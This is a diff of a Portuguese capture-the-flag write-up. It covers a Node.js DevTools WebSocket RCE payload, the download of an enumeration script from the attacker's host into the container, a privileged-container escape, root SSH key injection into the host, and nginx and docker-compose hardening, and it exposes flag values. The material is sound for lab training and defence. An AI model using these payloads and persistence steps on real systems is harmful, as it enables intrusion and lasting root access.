@@ -354,15 +354,14 @@ JSON contendo informações da sessão de debugging:
   "webSocketDebuggerUrl": "ws://172.16.3.113/7efa5220-45c7-44c2-b367-d9068de778bd"
 }
 ```
+<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/d47d4b67-07eb-4888-acef-3f69381a0b8a" />
 
 **Análise importante:**
-A URL do WebSocket debug usa a raiz + ID. Como estamos acessando via `/admin/internal-web-socket-endpoint/`, devemos construir:
+A URL do WebSocket debug usa a URL com ID. Como estamos acessando via `/admin/internal-web-socket-endpoint/` como "raiz" do debug, devemos testar:
 
 ```text
 ws://172.16.3.113:8000/admin/internal-web-socket-endpoint/7efa5220-45c7-44c2-b367-d9068de778bd
 ```
-
-<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/d47d4b67-07eb-4888-acef-3f69381a0b8a" />
 
 **✅ Conexão WebSocket aceita com sucesso no Postman.**
 
@@ -385,7 +384,7 @@ ws://172.16.3.113:8000/admin/internal-web-socket-endpoint/7efa5220-45c7-44c2-b36
 
 ### 9.2 Estrutura correta do Chrome DevTools Protocol
 
-Consultando a [documentação oficial](https://chromedevtools.github.io/devtools-protocol/), a estrutura correta é:
+Consultando a [documentação oficial](https://chromedevtools.github.io/devtools-protocol/), a ESTRUTURA correta é:
 
 ```json
 {
@@ -460,11 +459,8 @@ const result = execSync('whoami').toString();
 **Acessando `require` através do contexto global:**
 
 ```javascript
-// Usando process.mainModule (deprecated mas funcional)
+// Usando process.mainModule
 process.mainModule.require('child_process')
-
-// Alternativa moderna
-require('child_process')
 ```
 
 **Resumindo payload:**
@@ -499,6 +495,7 @@ A execução não pode quebrar o JSON e, portanto, precisamos colocar o comando 
 //
 // Payload:
 // process.require('child_process').execSync(\"id\").toString();
+// É necessário mainModule
 process.mainModule.require('child_process').execSync(\"id\").toString();
 ```
 
@@ -591,7 +588,7 @@ ls -la
 
 **Conclusão:** Estamos como root dentro de um container Docker, não na máquina principal. Necessário Docker Escape para a flag final.
 
-### 12.2 Melhorando interação da shell
+### 12.2 Melhorando interação da shell (NÃO É NECESSÁRIO)
 
 ```bash
 cd /root
@@ -613,13 +610,14 @@ stty raw -echo && fg
 hostname -I  # IP interno do container
 ```
 
-**Resultado:** `172.18.0.2`
+**Resultado:** `172.18.0.3`
 
-**Interpretação da rede Docker:**
+**INTERPRETAÇÃO da rede Docker:**
 
 - Range `172.18.0.0/16` = Rede bridge customizada
 - `172.18.0.1` = Gateway (provavelmente o host)  
-- `172.18.0.2` = Nosso container atual
+- `172.18.0.2` = Nossa máquina principal
+- `172.18.0.3` = Nosso container atual
 - Possíveis outros containers na mesma rede
 
 **Opções de lateral movement:**
@@ -642,16 +640,16 @@ hostname -I  # IP interno do container
 **Na máquina atacante:**
 
 ```bash
-wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
-python3 -m http.server 8000
+wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh #ou ir na pasta do seu deepce.sh
+python3 -m http.server 8000 #abrir server para transferir o arquivo para o container
 ```
 
 **No container alvo:**
 
 ```bash
-wget 10.0.30.175:8000/deepce.sh
-chmod +x deepce.sh
-./deepce.sh
+wget 10.0.30.175:8000/deepce.sh #colocar seu IP externo de maquina
+chmod +x deepce.sh #permissão ao script
+./deepce.sh #executar script - vai acabar n sendo necessário utilizar ele nesse caso
 ```
 
 ### 12.5 Docker Capabilities e Containers Privilegiados
@@ -720,22 +718,33 @@ mount /dev/nvme0n1p1 /mnt
 
 ### 13.3 Acesso ao host via SSH (método alternativo)
 
+#### Dentro da máquina pessoal:
+
 **Gerando chave SSH:**
 
 ```bash
+# dentro do meu diretório organizado
 ssh-keygen -t rsa -f rsa
+cat rsa.pub | base64 -w0 | xclip -sel clip
 ```
 
-**Copiando chave para authorized_keys do host:**
+#### Dentro da máquina alvo:
+
+**Copiando chave base64 para authorized_keys do host:**
 
 ```bash
-echo "<base64_da_chave_publica>" | base64 -d >> /mnt/root/.ssh/authorized_keys
+#cd .ssh #dentro do /mnt/root -> echo '<base64_da_chave_publica_shift_ctrl_c>' | base64 -d > authorized_keys
+echo 'c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FENURmbGVNTStESmNiTUxUSFZRd3lQT2lrYmI0QjV4eUFNb1JPZmdUKzIwWWtJSmxpcE91M25jTTB1N2tJb2ZZTE1NUTY2ZzIycFVkZHNxWXNXclZyUnNGSjZEVEFVT0lubVlESHdjMlVZM0ZzWWdFUjBsV0RaTlJ5b2lTS3hNS2hLTW42VWxWc21GVGx2MDBDNGFrQml1MnlvQytVb2hWaDlYTDdsNFd2eE5EWk05TDF3b0wxdWtRZGUyMDUxd2lWakVKc1kvNXFoUGJzUUM1V2o5YmttNmdYcS96YVExdEQzVW9HbVZtMjhnN1dNMk1BNFVaWGVxOGw4Qnh2YVV5bFZDdU9nZW9NNW5lUlFFUUxiOERGWVdDZmVBYWF0SFBPaDdmTGZnQThkRUxHbS82VUFKSGtjSmJrdzdkMUdHeFRlQlZ1UENvM3FGVzFNbDVvVW1UZUVUNUduaVkwUzJQazlSYjZmblEyQnBUQXpOYmg0R2JFNVN2Ykt4Wjl5ZFFNdnlETUpicDNjYldLekhVdFFLQ0RTNEFJZGI0TW95ZUpzeUE3T1UwL2xkV2M3OCt2UFVoK1daZlIyRnFSSUtMbmdHRUtocDFueHRQRVVmeFpzY3BLSlNGRWEyTE5ZZENCbGtxcHowZDh5ejFvazBEeTdMOFhlUmtHbXhXOHlMQ2M9IG1hdGhldXNAbGFpZGxlcgo=' | base64 -d >> /mnt/root/.ssh/authorized_keys
 ```
 
 **Acesso SSH direto ao host:**
 
 ```bash
-ssh -i rsa root@<IP_HOST>
+matheus@laidler ~/tunnel$ sudo ssh -i rsa root@172.16.3.113
+#> yes
+#...
+root@ip-172-16-3-113# ls -la
+#pronto, entramos na máquina host como root direto.
 ```
 
 ✅ **Root no host**  
@@ -746,7 +755,7 @@ ssh -i rsa root@<IP_HOST>
 Com acesso completo ao filesystem do host via mount:
 
 ```bash
-cd /mnt/root  
+#cd /mnt/root 
 ls -la
 cat root.txt
 ```
@@ -759,30 +768,116 @@ hackingclub{d349c11e22a06b34d04e58***************6a0d302}
 
 ## 15. Análise do ambiente pós-exploração
 
+Ao estar logado na máquina host, seja ao acessar a partição montada no container (`/mnt/root`) ou acessando diretamente via SSH, ao listar o diretório veremos a pasta `stack`.
+
+```bash 
+ls -la
+cd stack
+ls
+```
+
 ### 15.1 Verificando configurações Nginx
 
+Dentro da pasta STACK teremos:
+ `Dockerfile.proxy`  `Dockerfile.spring`  `app`  `conf`  `docker-compose.yaml`  `spring`
+
+Ao darmos um `cat Dockerfile.proxy` veremos que `conf/nginx.conf` é copiado para dentro do `/etc/nginx/conf.d/default.conf` do container.
+
+Podemos continuar a explorar diversos destes itens, veremos também o docker-compose.yaml assim como veremos o arquivo de configuração do nginx e verificar se era ele mesmo que estava bloqueando o acesso ao endpoint: :
+
 ```bash
-cat /mnt/path/to/Dockerfile.proxy
+cat docker-compose.yaml 
 ```
 
-**Análise:** Nginx baseado na imagem oficial, copiando `conf/nginx.conf` para `/etc/nginx/conf.d/default.conf`
+```yaml
+version: "3"
+services:
+  backend:
+    restart: always
+    build:
+      context: .
+      dockerfile: Dockerfile.spring
+    environment:
+      - SPRING_PROFILES_ACTIVE=prod
+      - FLAG="hackingclub{c71b3ebb3e********************9a3f}"
+      - NODE_DEBUG_HOST="http://internal:8000/"
+      - NODE_DEBUG_PATH="/admin/internal-web-socket-endpoint"
+  proxy:
+    restart: always 
+    build:
+      context: .
+      dockerfile: Dockerfile.proxy
+    ports:
+      - "8000:80"
+    depends_on:
+      - backend
+      - internal
+    links:
+      - backend
+      - internal
+  internal:
+    restart: always   
+    image: node
+    user: "root"
+    command: "node --inspect=0.0.0.0:8000 /app/server.js"
+    volumes:
+      - ./app:/app
+    privileged: true
 
-```bash
-cat /mnt/path/to/conf/nginx.conf
 ```
 
-**Configurações confirmadas:**
+```bash
+cd conf
+ls
+cat nginx.conf
 
-- Bloqueio explícito de `/actuator`  
-- Permissão para header `Upgrade: h2c`
-- Proxy para diferentes backends:
-  - backend (Spring Boot)
-  - internal (Node debugging endpoint)
+```
+```conf
+server {
+    listen       80 default_server;
+    server_name  localhost;
+
+    location / {
+     proxy_pass http://backend:8080;
+     proxy_http_version 1.1;
+     proxy_set_header Upgrade $http_upgrade;
+     proxy_set_header Connection $http_connection;
+    }
+
+    location /actuator {
+    deny all;
+    }
+
+    location /admin/internal-web-socket-endpoint/ {
+        proxy_pass http://internal:8000/;
+        proxy_http_version 1.1;
+        proxy_set_header Upgrade $http_upgrade;
+        proxy_set_header Connection $http_connection;
+        proxy_set_header Host $host;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+    }
+
+}
+
+```
+
+ -  - Dockerfile.spring -> springboot -> internal -> NODE_DEBUG_PATH -> http://backend:8080 -> ...
+
+Perceba que:
+ - O host backend é o springboot 
+ - Todo request que vai paro a raiz "/" então vai para o springboot
+ - Possui o header ´Upgrade`, isto é, aceita upgrade de HTTP1.1 para HTTP2
+ - Nginx bloqueando com o `Deny all` se o endpoint `/actuator` for acessado
+ - A config de acesso ao `admin/internal/web-socket-endpoint/` é internal:8000, que é a aplicacao do node *(container que caimos e pegamos shell)*
+ - Falta verificar ainda o arquivo de configuração do Sping, que vai ser necessário saber como a má configuração possibilita o Request Smuggling
 
 ### 15.2 Verificando configuração Spring Boot
 
 ```bash
-cat /mnt/path/to/spring/src/main/resources/application.yaml
+ cd spring/spring/
+ ls
+ cd src/main/resources/
+ cat application.yaml
 ```
 
 **Configuração crítica confirmada:**
@@ -793,7 +888,16 @@ server:
     enabled: true
 ```
 
-**Análise:** Requisito obrigatório para h2c smuggling — HTTP/2 deve estar habilitado no backend.
+**Análise:** Requisito obrigatório para h2c smuggling (HTTP/2 deve estar habilitado no backend).
+
+### 15.3 Configurações confirmadas:
+
+- Bloqueio explícito de `/actuator`  
+- Permissão para header `Upgrade: h2c`
+- Proxy para diferentes backends:
+  - backend (Spring Boot)
+  - internal (Node debugging endpoint)
+- Spring Boot configurado com server `http2` enable
 
 ## 16. Análise técnica e mitigações
 
@@ -805,7 +909,7 @@ server:
 4. **Chrome DevTools Protocol** → Exploração de WebSocket de debugging Node.js
 5. **RCE via CDP** → Execução de JavaScript com child_process  
 6. **Container privilegiado** → Docker escape via mount de filesystem
-7. **Host compromise** → Acesso root completo ao sistema hospedeiro
+7. **Host compromise** → Acesso root completo ao sistema hospedeiro via SSH
 
 ### 16.2 Mitigações recomendadas
 
@@ -818,15 +922,69 @@ server:
 **Exemplo de configuração segura Nginx:**
 
 ```nginx
-# Rejeitar explicitamente upgrades H2C
+# ────────────────────────────────────────────────
+#   DEFESAS BÁSICAS CONTRA H2C / REQUEST SMUGGLING
+# ────────────────────────────────────────────────
+
+# Bloqueia tentativas de upgrade para HTTP/2 em texto puro (H2C)
+# Isso evita ataques como "H2C smuggling" via reverse proxy.
 if ($http_upgrade ~* "h2c") {
     return 400;
 }
 
-# Remover headers perigosos
+# Remove headers perigosos para impedir upgrades indevidos
+# (previne WebSocket/H2C sendo ativados quando não deveria)
 proxy_set_header Upgrade "";
 proxy_set_header Connection "";
+
+
+# ────────────────────────────────────────────────
+#   CONFIGURAÇÃO PRINCIPAL DO SERVIDOR
+# ────────────────────────────────────────────────
+server {
+    listen 80 default_server;
+    server_name localhost;
+
+    # ────────────────────────────────────────────
+    #   / → backend Java
+    # ────────────────────────────────────────────
+    location / {
+        proxy_pass http://backend:8080;
+        proxy_http_version 1.1;
+
+        # Permite upgrade somente quando realmente necessário
+        # (evita fallback para valores vazios do bloco global)
+        proxy_set_header Upgrade $http_upgrade;
+        proxy_set_header Connection $http_connection;
+    }
+
+    # ────────────────────────────────────────────
+    #   /actuator → proibido externamente
+    # ────────────────────────────────────────────
+    location /actuator {
+        deny all;
+    }
+
+    # ────────────────────────────────────────────
+    #   WebSocket interno do serviço "internal"
+    # ────────────────────────────────────────────
+    location /admin/internal-web-socket-endpoint/ {
+        proxy_pass http://internal:8000/;
+        proxy_http_version 1.1;
+
+        # Upgrades só para WebSocket legítimo
+        proxy_set_header Upgrade $http_upgrade;
+        proxy_set_header Connection $http_connection;
+
+        # Headers necessários para WebSockets atrás de proxy
+        proxy_set_header Host $host;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+    }
+}
+
 ```
+
+ - Este código ainda não está 100%, mas já resolve essa situação atual
 
 #### 16.2.2 Spring Boot Actuator
 
@@ -842,7 +1000,7 @@ management:
   security:
     enabled: true  # Autenticação obrigatória
   server:
-    port: 8081  # Porta administrativa separada
+    port: 8081  # Porta administrativa SEPARADA
 ```
 
 #### 16.2.3 Node.js DevTools
@@ -863,28 +1021,116 @@ if (process.env.DEBUG_MODE === 'true' && process.env.NODE_ENV === 'development')
 
 ```yaml
 # docker-compose.yml
+version: "3.8"
+
 services:
-  app:
-    # Segurança de container
+  backend:
+    restart: always
+    build:
+      context: .
+      dockerfile: Dockerfile.spring
+
+    environment:
+      - SPRING_PROFILES_ACTIVE=prod
+      - FLAG="hackingclub{c71b3ebb3e25f3c8304d9010a1c3765742309a3f}"
+      - NODE_DEBUG_HOST="http://internal:8000/"
+      - NODE_DEBUG_PATH="/admin/internal-web-socket-endpoint"
+
+    # ──────────────────────────────
+    #  HARDENING / SEGURANÇA
+    # ──────────────────────────────
+
+    security_opt:
+      - no-new-privileges:true    # Impede que qualquer processo ganhe privilégios extra (mesmo via exploit)
+
+    cap_drop:
+      - ALL                        # Remove TODAS capabilities Linux (mitiga contêiner pivot e syscalls perigosas)
+
+    # cap_add: []                  # Não adicionamos nada — backend não deveria precisar de capabilities
+
+    read_only: true                # Filesystem somente leitura → impede webshell escrita, modificação de binários etc.
+    user: "1000:1000"              # Roda como usuário NÃO-ROOT → reduz impacto de RCE
+
+    networks:
+      - app-network                # Isolamento de rede entre serviços (evita exposição desnecessária)
+
+  proxy:
+    restart: always 
+    build:
+      context: .
+      dockerfile: Dockerfile.proxy
+
+    ports:
+      - "8000:80"
+
+    depends_on:
+      - backend
+      - internal
+
+    # ──────────────────────────────
+    #  HARDENING / SEGURANÇA (PROXY)
+    # ──────────────────────────────
+
     security_opt:
       - no-new-privileges:true
+
     cap_drop:
       - ALL
+
     cap_add:
-      - CHOWN  # Apenas capabilities estritamente necessárias
-    read_only: true  # Filesystem somente leitura
-    user: "1000:1000"  # Usuário não-root
-    
-    # Isolamento de rede  
+      - NET_BIND_SERVICE           # ÚNICA capability necessária para rodar na porta 80 sem ser root
+
+    read_only: true
+    user: "1000:1000"
+
     networks:
       - app-network
-    
-    # Limites de recursos
-    deploy:
-      resources:
-        limits:
-          cpus: "0.5"
-          memory: "512M"
+
+  internal:
+    restart: always
+    image: node
+
+    # privileged: true  (FORMATO ORIGINAL) X
+    # ► PERIGO EXTREMO: dá root TOTAL no host, permite escape completo via RCE.
+    privileged: false     # Agoras está seguro.
+
+    # ──────────────────────────────
+    #    HARDENING / SEGURANÇA
+    # ──────────────────────────────
+
+    security_opt:
+      - no-new-privileges:true
+
+    cap_drop:
+      - ALL                 # Remove todas capabilities
+    # cap_add pode ser adicionado se o Node precisar de algo (normalmente não precisa)
+
+    read_only: true         # Torna o filesystem imutável → ataques RCE não conseguem alterar server.js
+
+    user: "1000:1000"       # Roda como user normal, não root → evita syscalls perigosas
+
+    # Se o Node precisar escrever em /tmp, criamos um tmpfs volátil, não gravado em disco
+    tmpfs:
+      - /tmp
+
+    command: "node --inspect=0.0.0.0:8000 /app/server.js"
+
+    volumes:
+      - ./app:/app:ro       # Volume somente leitura → impede sobrescrita do código da aplicação
+
+    networks:
+      - app-network
+
+# ──────────────────────────────
+#    ISOLAMENTO DE REDE
+# ──────────────────────────────
+# Apenas serviços dentro dessa network podem se comunicar.
+# Nada é exposto externamente exceto o que o proxy expõe.
+# ──────────────────────────────
+networks:
+  app-network:
+    driver: bridge
+
 ```
 
 **Dockerfile seguro:**
@@ -967,13 +1213,13 @@ Este cenário demonstra uma **cadeia crítica** onde múltiplas vulnerabilidades
 1. `hackingclub{c71b3ebb3e25f3c8304d90***************309a3f}` (via /actuator/env)  
 2. `hackingclub{d349c11e22a06b34d04e58***************6a0d302}` (via Docker escape)
 
-**Técnicas utilizadas:**
+**Tópicos reconhecidos neste cenário:**
 
-- HTTP/2 Cleartext Smuggling
-- Spring Boot Actuator enumeration  
-- Chrome DevTools Protocol RCE
-- Docker privilege escalation
-- Host filesystem mounting
+- HTTP/2 Cleartext Smuggling / Proxy Request Smuggling / H2C Upgrade Abuse
+- Information Disclosure / Spring Boot Actuator enumeration / Attack Surface Mapping
+- CDP WebSocket Debug Port RCE / Chrome DevTools Protocol RCE / CDP Remote Code Execution
+- Privileged Container Escape / Container Breakout via Host Filesystem Mount / Rootfs Access
+- SSH Authorized Keys Injection / SSH Key Injection Persistence / Privilege Escalation & Host Persistence
 
 <img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/f0667214-3a4e-4ad9-b792-0d97287fb8ca" />
 
@@ -985,3 +1231,184 @@ Referências:
  - [Crowsec](https://blog.crowsec.com.br/)
  - [Chrome DevTools](https://chromedevtools.github.io/)
  - [Hacking Club](https://app.hackingclub.com/training/training-machines/176)
+
+
+### 16.5 Extra: 
+
+#### Nginx config robusto (mais seguro)
+
+ ```nginx
+ # nginx.conf (trecho para incluir no bloco 'http { ... }' ou como arquivo único)
+# ------------------------------------------------------------
+# CONTEXTO http: variáveis, maps e regras globais para mitigações
+# ------------------------------------------------------------
+
+# Map para normalizar valor de Connection quando o Upgrade for websocket.
+# Isso evita problemas onde múltiplos valores ou variações causam comportamento ambíguo.
+# Usamos esse map para só permitir "Upgrade" quando for realmente websocket.
+map $http_upgrade $connection_upgrade {
+    default "";
+    ~*websocket  "Upgrade";
+}
+
+# Limite de taxa global (ex.: 10 req/seg por IP com burst)
+# Protege contra brute force / abuse em endpoints públicos.
+limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s;
+
+# Desativa underscores em headers para reduzir confusão entre header names.
+# Alguns atacantes usam underscores para manipular roteadores/proxies.
+underscores_in_headers off;
+
+# Ignora headers inválidos (ajuda contra request smuggling por headers malformados).
+# Quando on, Nginx rejeita headers que não seguem o formato 'Name: value'.
+ignore_invalid_headers on;
+
+# Ajustes de buffers para mitigar headers muito grandes (evita header injection / DoS)
+large_client_header_buffers 4 16k;
+
+# Proteção contra request body muito grande (mitiga upload malicioso / RCE por payloads)
+client_max_body_size 1M;        # ajustar conforme necessidade da sua app
+client_body_timeout 10s;
+
+# Timeout para leitura/escrita no cliente
+send_timeout 10s;
+keepalive_timeout 15s;
+
+# Configurações padrão de proxy que aplicaremos globalmente.
+# NOTA: aqui limpamos Upgrade/Connection por padrão (evita proxies que herdam header perigoso).
+proxy_set_header Upgrade "";
+proxy_set_header Connection "";
+proxy_http_version 1.1;        # necessário para WebSocket; mas cuidado: controlamos onde habilitar Upgrade
+proxy_set_header Host $host;
+proxy_set_header X-Real-IP $remote_addr;
+proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+
+# Cabeçalhos de segurança básicos que vale sempre incluir (ajuste conforme sua aplicação)
+# HSTS só deve ser ativado em produção com HTTPS — aqui exemplifico.
+add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
+add_header X-Frame-Options "DENY" always;
+add_header X-Content-Type-Options "nosniff" always;
+add_header Referrer-Policy "no-referrer-when-downgrade" always;
+# CSP minimal — ajuste concreto conforme os recursos da sua app
+add_header Content-Security-Policy "default-src 'self'; object-src 'none'; frame-ancestors 'none';" always;
+
+
+# ------------------------------------------------------------
+# BLOCO DO SERVIDOR (substituir o server atual)
+# ------------------------------------------------------------
+server {
+    listen       80 default_server;
+    server_name  localhost;
+
+    # --------------------------
+    #  Proteção global contra H2C
+    #  - Rejeita explicitamente qualquer tentativa de Upgrade para h2c
+    #  - Deve ficar aqui, no topo do server, aplicado antes dos locations
+    # --------------------------
+    if ($http_upgrade ~* "h2c") {
+        # Retorna 400 Bad Request para tentativas de upgrade para HTTP/2 cleartext
+        # (mitiga H2C bypass / cleartext upgrade exploits).
+        return 400;
+    }
+
+    # --------------------------
+    #  Proteções contra request smuggling (CL / TE)
+    #  - Forçamos comportamento consistente: Nginx já gerencia CL/TE, mas:
+    #    * ignore_invalid_headers on (acima) ajuda a rejeitar headers malformados
+    #    * não repassamos Transfer-Encoding nem TE por padrão
+    # --------------------------
+    proxy_set_header Transfer-Encoding "";   # evita que Transfer-Encoding seja repassado
+    proxy_set_header TE "";                  # remove TE header se existir
+
+    # --------------------------
+    #  endpoint público principal -> backend Spring
+    # --------------------------
+    location / {
+        # Proteção de rate limit aplicada (evita abuso em endpoint root)
+        limit_req zone=one burst=20 nodelay;
+
+        # Proxy para o serviço backend (nome do serviço docker-compose)
+        proxy_pass http://backend:8080;
+
+        # Forçamos HTTP/1.1 para permitir keepalive entre proxy e backend
+        proxy_http_version 1.1;
+
+        # NÃO repassar Upgrade/Connection por padrão (evitamos upgrades indesejados)
+        # Usamos as variáveis normalizadas declaradas no topo.
+        proxy_set_header Upgrade "";               # bloqueado por default
+        proxy_set_header Connection "";            # bloqueado por default
+
+        # Timeouts e buffers do proxy (mitigam slowloris e proxied DoS)
+        proxy_read_timeout 30s;
+        proxy_send_timeout 30s;
+        proxy_buffering on;
+        proxy_buffers 8 16k;
+        proxy_busy_buffers_size 32k;
+
+        # Tamanhos máximos para evitar uploads grandes não autorizados
+        client_max_body_size 1M;
+    }
+
+    # --------------------------
+    #  Bloqueio do endpoint /actuator (não acessível externamente)
+    #  - Ideal: deixar esse endpoint apenas na loopback ou na network docker interna
+    # --------------------------
+    location /actuator {
+        # Rejeita todo acesso externo
+        deny all;
+        # Se quiser permitir logs internos, use allow 127.0.0.1; deny all;
+    }
+
+    # --------------------------
+    #  Rota WebSocket / endpoint de debug interno
+    #  Este location habilita Upgrade apenas AQUI e de forma controlada.
+    #  Regras:
+    #   - só habilitamos Upgrade para 'websocket' (map + connection_upgrade)
+    #   - sanitizamos headers
+    #   - rate limit mais restritivo
+    # --------------------------
+    location /admin/internal-web-socket-endpoint/ {
+        # Rate limit mais restrito (ex: 5 req/s)
+        limit_req zone=one burst=10 nodelay;
+
+        # Proxy para o service 'internal' que roda o websocket/debug
+        proxy_pass http://internal:8000/;
+        proxy_http_version 1.1;
+
+        # Permite Upgrade somente se $http_upgrade indicar websocket (map definido em http{})
+        # Isso evita aceitar h2c ou outras tentativas de upgrade forçadas.
+        proxy_set_header Upgrade $http_upgrade;
+        proxy_set_header Connection $connection_upgrade;
+
+        # Headers úteis
+        proxy_set_header Host $host;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Real-IP $remote_addr;
+
+        # Timeouts para sockets (ajuste conforme necessidade)
+        proxy_read_timeout 120s;
+        proxy_send_timeout 120s;
+
+        # Limita o tamanho de headers e body para esse endpoint sensível
+        client_max_body_size 256k;
+
+        # Proteções adicionais: não permitir buffer excessivo
+        proxy_buffering off;
+    }
+
+    # --------------------------
+    #  Erros e páginas (manter simples)
+    # --------------------------
+    error_page 400 401 403 404 500 502 503 504 /50x.html;
+    location = /50x.html {
+        root /usr/share/nginx/html;
+    }
+}
+
+# ------------------------------------------------------------
+# FIM do arquivo
+# ------------------------------------------------------------
+
+ ```
+
+ ###### 
